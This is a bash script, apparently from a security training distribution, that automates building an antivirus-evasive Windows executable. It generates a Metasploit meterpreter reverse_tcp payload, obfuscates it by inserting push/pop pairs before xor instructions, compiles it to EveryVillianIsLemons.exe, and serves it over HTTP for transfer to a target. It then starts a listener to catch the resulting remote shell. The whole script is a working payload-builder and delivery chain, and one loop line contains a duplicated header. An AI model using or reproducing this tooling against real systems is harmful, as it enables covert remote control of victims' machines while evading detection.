#!/bin/bash
clear
#rvm use system
#source /home/adhd/.rvm/environments/ruby-1.9.3-p484@metasploit-framework
#cp /opt/metasploit/Gemfile /tmp
#cd /tmp
#bundle install

clear
echo 
echo "---------------------------"
echo "Ghostwriting For ADHD 0.7.3"
echo "---------------------------"
echo
echo "1) If you run into trouble, check your firewall rules."
echo "2) This script assumes no NAT or port forwarding from your target to you."
echo "3) Have fun!"
echo
echo "Working.."
ip=`ifconfig | grep inet\ addr | awk -F: '{print $2 }' | cut -d" " -f 1 | grep -v "127"`
 
if ! [ -e "/usr/lib/ruby/vendor_ruby/metasm.rb" ]
then
    ln -s lib/metasm/metasm.rb /usr/lib/ruby/vendor_ruby/metasm.rb
fi
 
if ! [ -d "/usr/lib/ruby/vendor_ruby/metasm" ]
then
    ln -s lib/metasm/metasm /usr/lib/ruby/vendor_ruby/metasm
fi
 
if [ -e "/opt/metasploit/raw_binary" ]
then
    rm -f /opt/metasploit/raw_binary
fi
 
if [ -e "/opt/metasploit/EveryVillianIsLemons.exe" ]
then
        rm -f /opt/metasploit/EveryVillianIsLemons.exe
fi
 
if [ -e "/opt/metasploit/asm_code.asm" ]
then
    rm -f /opt/metasploit/asm_code.asm
fi


cd /opt/metasploit
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=8080 -f raw -o /opt/metasploit/raw_binary
 
cd -
ruby lib/metasm/samples/disassemble.rb /opt/metasploit/raw_binary > /opt/metasploit/asm_code.asm
 
for i in for i in `cat /opt/metasploit/asm_code.asm | grep xor | awk -F" " '{print $3}'`
do
    sed "
    /xor ${i}/ i\
    push ${i}\\
pop ${i}
        " /opt/metasploit/asm_code.asm > tmp.asm
    mv -f tmp.asm /opt/metasploit/asm_code.asm
done
 
lines[0]='.entrypoint'
lines[1]='.section \".text\" rwx'
for line in "${lines[@]}"
do
sed "1i\
${line}
" /opt/metasploit/asm_code.asm > tmp.asm
mv -f tmp.asm /opt/metasploit/asm_code.asm
done
 
#sed '1i\
#.section \".text\" rwx
#' asm_code.asm > tmp.asm
#mv -f tmp.asm asm_code.asm
 
ruby lib/metasm/samples/peencode.rb /opt/metasploit/asm_code.asm -o /opt/metasploit/EveryVillianIsLemons.exe
 
 
echo
echo "****************************************************"
echo "Opening webserver on ${ip}:8000 for file transfer"
echo "Ctrl+C to continue after file transfer"
echo "****************************************************"
if [ -e "/tmp/serve" ]; then
rm -rf /tmp/serve
fi
mkdir /tmp/serve
cp /opt/metasploit/EveryVillianIsLemons.exe /tmp/serve
cd /tmp/serve
touch favicon.ico
python -m "SimpleHTTPServer"
cd /opt/metasploit
rm -rf /tmp/serve
clear
echo "File Transfer Complete, probably..."
 
echo -e "Would you like to start the handler now? [y/N] "
read choose
if [[ $choose == y* || $choose == Y* ]]
then
    echo "Starting Handler"
    /opt/metasploit/msfconsole -x "use exploit/multi/handler; set LHOST $ip; set LPORT 8080; exploit"
else
    echo "Don't forget to do it yourself later"

fi
